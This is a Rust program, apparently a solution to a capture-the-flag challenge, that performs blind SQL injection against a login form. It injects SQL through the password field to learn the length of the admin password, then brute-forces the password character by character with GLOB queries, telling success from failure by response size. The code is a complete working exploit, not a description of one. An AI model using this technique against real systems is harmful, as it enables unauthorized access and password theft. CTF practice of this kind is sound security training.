#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    eprintln!("*** 開始 ***");

    let client = reqwest::Client::new();
    let url = "https://ctfq.u1tramarine.blue/q6/";
    let mut password_length = 0;

    for i in 6..=100 {
        let inject_sql = format!(
            "{}{}{}",
            "' or (select length(pass) from user where id = 'admin') = ",
            i.to_string(),
            "; --"
        );
        let param = [("id", "admin"), ("pass", &inject_sql)];
        let resp = client.post(url).form(&param).send().await?;

        let body = resp.text().await?;
        if body.len() >= 2000 {
            println!("パスワード文字数取得成功：{}文字", i);
            password_length = i;
        }
        //ログイン成功時レスポンス文字数：2237
        //ログイン失敗時レスポンス文字数：484 or 562
    }

    if password_length == 0 {
        println!("ループ内でパスワードの文字数に一致しませんでした。");
    }

    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".to_string();
    let mut password = "FLAG_".to_string();

    for _ in 6..=password_length+1 {
        for c in chars.chars() {
            let mut tmp_password = password.clone();
            tmp_password.push(c);
            let inject_sql = format!(
                "{}{}{}",
                "' or (select count(*) from user where pass glob '",
                tmp_password,
                "*') >= 1; --",
            );

            let param = [("id", "admin"), ("pass", &inject_sql)];
            let resp = client.post(url).form(&param).send().await?;    
            let body = resp.text().await?;

            if body.len() >= 2000 {
                println!("パスワード取得成功：{}", &password);
                password = tmp_password;
                break
            }
        }
    }

    println!("最終パスワード：{}",&password);
    eprintln!("*** 終了 ***");

    Ok(())
}
